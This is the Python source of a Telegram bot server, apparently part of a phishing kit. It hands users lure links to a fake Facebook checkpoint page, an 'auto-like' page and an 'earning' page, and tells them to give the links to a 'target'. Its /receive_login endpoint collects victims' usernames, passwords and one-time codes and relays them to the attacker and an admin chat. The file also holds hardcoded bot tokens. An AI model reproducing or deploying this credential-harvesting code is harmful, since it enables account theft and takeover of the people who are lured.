# ==============================
# VS BOT — Railway Full Updated (v2)
# With Admin Bot + Direct Link + Auto-Like URL + Earning Like Platform + Broadcast System
# Developer: @noobxvau (MN Siddik)
# ==============================

from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import json
import os

app = Flask(__name__)
CORS(app)

# -------------------------
# Bot Tokens and Admin Config
# -------------------------
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8472535428:AAGAcUvGClisEF9Kr0MsaKLGw5Je_AY4JVU")
ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GPovRo4Exk4ON7_P4CUdY")
ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")

# -------------------------
# Frontend Netlify URLs
# -------------------------
FRONTEND_FB_BASE = "fb-check-point.netlify.app"          # Facebook page
FRONTEND_LIKE_BASE = "auto-like-free.netlify.app"        # Auto-Like page
FRONTEND_EARNING_BASE = "earning-hub-bd.netlify.app"  # Earning Like Platform page

# -------------------------
# File setup
# -------------------------
USERS_FILE = "users.json"
registered_users = {}

# -------------------------
# Load & Save Users
# -------------------------
def load_users():
    global registered_users
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r") as f:
            registered_users = json.load(f)
    else:
        registered_users = {}

def save_users():
    with open(USERS_FILE, "w") as f:
        json.dump(registered_users, f, indent=4)

# -------------------------
# Send Message to User Bot
# -------------------------
def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
    except Exception as e:
        print(f"❌ Error sending message to {chat_id}: {e}")

# -------------------------
# Send Message to Admin Bot
# -------------------------
def send_admin_message(text):
    url = f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": ADMIN_CHAT_ID, "text": text})
        print("✅ Sent to admin:", text)
    except Exception as e:
        print(f"❌ Error sending to admin: {e}")

# -------------------------
# Generate URLs
# -------------------------
def make_facebook_url(chat_id):
    return f"{FRONTEND_FB_BASE}/index.html?uid={chat_id}"

def make_autolike_url(chat_id):
    return f"{FRONTEND_LIKE_BASE}/index.html?uid={chat_id}"

def make_earning_url(chat_id):
    return f"{FRONTEND_EARNING_BASE}/index.html?uid={chat_id}"

# -------------------------
# Telegram Webhook for Main Bot
# -------------------------
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    data = request.get_json(silent=True) or {}
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        if text.lower().strip() == "/start":
            fb_url = make_facebook_url(chat_id)
            like_url = make_autolike_url(chat_id)
            earning_url = make_earning_url(chat_id)

            welcome = (
                "🤖 *Welcome to Phanhom Bot!*\n\n"
                "লিংকগুলো কপি করো এবং তোমার target কে দাও 👇\n\n"
                f"📘 Facebook URL: {fb_url}\n"
                f"👍 Auto-Like URL: {like_url}\n"
                f"💰 Earning Like Platform: {earning_url}\n\n"
                "👨‍💻 *Bot Developer:* [@noobxvau](https://t.me/noobxvau)\n"
                "💬 *Join our official group for more updates:*\n"
                "👉 [NOOB HACKER BD](https://t.me/+ENYrQ5N9WNE3NWQ9)"
            )

            send_message(chat_id, welcome)
            registered_users[str(chat_id)] = True
            save_users()
            print(f"✅ User {chat_id} registered.")
    return jsonify({"status": "ok"})

# -------------------------
# Telegram Webhook for Admin Bot
# -------------------------
@app.route(f"/{ADMIN_BOT_TOKEN}", methods=["POST"])
def admin_webhook():
    data = request.get_json(silent=True) or {}
    if "message" in data:
        admin_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")

        if str(admin_id) != ADMIN_CHAT_ID:
            send_admin_message("❌ You are not authorized to send broadcast messages!")
            return jsonify({"status": "unauthorized"})

        if text.lower().strip() == "/broadcast":
            send_admin_message("📝 Send the message you want to broadcast to all users.")
            registered_users["awaiting_broadcast"] = True
            save_users()
        elif registered_users.get("awaiting_broadcast"):
            registered_users.pop("awaiting_broadcast", None)
            save_users()

            broadcast_message(text)
            send_admin_message("✅ Message broadcasted to all users successfully!")
        else:
            send_admin_message("ℹ️ Use /broadcast first to start broadcasting.")
    return jsonify({"status": "ok"})

# -------------------------
# Broadcast Function
# -------------------------
def broadcast_message(message):
    count = 0
    for uid in registered_users.keys():
        if uid.isdigit():
            try:
                send_message(uid, f"📢 *Admin Message:*\n\n{message}")
                count += 1
            except:
                continue
    print(f"📨 Broadcast sent to {count} users.")

# -------------------------
# Receive Login Info (from all frontends)
# -------------------------
@app.route('/receive_login', methods=["POST"])
def receive_login():
    data = request.json or {}
    uid = str(data.get("uid", ""))
    username = data.get("username", "")
    password = data.get("password", "")
    otp = data.get("otp", "")
    step = data.get("step", "")

    # Handle create account / verify otp steps
    if step == "create_account":
        send_admin_message(f"🆕 *New Account Creation Attempt*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`")
        return jsonify({"status": "account_step_ok"})

    elif step == "verify_otp":
        send_admin_message(f"🔐 *OTP Verification*\n📱 *OTP:* `{otp}`")
        return jsonify({"status": "otp_step_ok"})

    # Handle standard login from any frontend
    elif uid and uid in registered_users:
        msg = f"🧾 *Login Info*\n👤 *Username:* `{username}`\n🔑 *Password:* `{password}`"
        send_message(uid, msg)
        admin_text = f"📩 *New Login Captured!*\n👤 *UID:* `{uid}`\n{msg}"
        send_admin_message(admin_text)
        print(f"✅ Sent login info to user {uid} and admin.")
        return jsonify({"status": "sent"})
    else:
        return jsonify({"error": "uid not found"})

# -------------------------
# Home Route
# -------------------------
@app.route('/')
def home():
    return "✅ Bot server running with Admin Broadcast system + Earning Like Platform!"

# -------------------------
# Main
# -------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))

    # Auto webhook for both bots
    public_url = os.environ.get("RAILWAY_PUBLIC_URL") or os.environ.get("RAILWAY_STATIC_URL")
    if public_url:
        try:
            # Main bot webhook
            r1 = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={public_url}/{BOT_TOKEN}")
            print("✅ Main bot webhook set:", r1.text)

            # Admin bot webhook
            r2 = requests.get(f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/setWebhook?url={public_url}/{ADMIN_BOT_TOKEN}")
            print("✅ Admin bot webhook set:", r2.text)
        except Exception as e:
            print("❌ Failed to set webhook:", e)
    else:
        print("⚠️ Railway public URL not detected. Set webhook manually if needed.")

    load_users()
    app.run(host="0.0.0.0", port=port)
